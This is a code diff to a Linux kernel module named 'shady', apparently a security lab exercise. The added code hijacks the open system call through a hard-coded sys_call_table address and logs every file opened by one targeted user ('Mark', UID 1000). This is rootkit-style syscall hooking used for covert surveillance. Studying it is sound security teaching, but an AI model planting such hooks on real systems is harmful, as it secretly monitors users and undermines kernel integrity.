@@ -29,6 +29,7 @@
 #include <linux/device.h>
 #include <linux/mutex.h>
 #include <linux/unistd.h>
+#include <linux/cred.h>
 
 #include <asm/uaccess.h>
 
@@ -52,9 +53,7 @@ static struct shady_dev *shady_devices = NULL;
 static struct class *shady_class = NULL;
 /*** ADDED by Christopher Allan***/
 static unsigned long syscall_table = 0xffffffff81801400;  // sys_call_table
-                               // open index = 0x02 OR 0x05 ???
-                               //  -> 0xffffffff811c3080
-
+static uid_t marksUID = 1000; // mark's User ID
 /* ================================================================ */
 
 void
@@ -224,7 +223,12 @@ shady_cleanup_module(int devices_to_destroy)
 
 asmlinkage int my_open(const char* file, int flags, int mode)
 {
-  printk("SHADY_MODULE: Captured Open...\n");
+  kuid_t whoDis = current_uid();
+  if(whoDis.val == marksUID)
+    {
+      printk("Mark is about to open '%s'\n", file);
+    }
+
   return old_open(file, flags, mode);
 }
 
@@ -236,9 +240,12 @@ shady_init_module(void)
   int devices_to_destroy = 0;
   dev_t dev = 0;
 
+  // set syscall table to read/write
   set_addr_rw(syscall_table);
-  old_open = ((unsigned long*)syscall_table)[5];
-  ((unsigned long*)syscall_table)[5] = my_open;
+  // store old open to be restored later
+  old_open = ((void **)syscall_table)[__NR_open];
+  // save over open reference with my_open.  Muwahahaha.
+  ((void **)syscall_table)[__NR_open] = &my_open;
 	
   if (shady_ndevices <= 0)
     {
@@ -292,6 +299,9 @@ static void __exit
 shady_exit_module(void)
 {
   shady_cleanup_module(shady_ndevices);
+  // CA: replace old open when removing module
+  ((void **)syscall_table)[__NR_open] = (void *)old_open;
+
   return;
 }
 
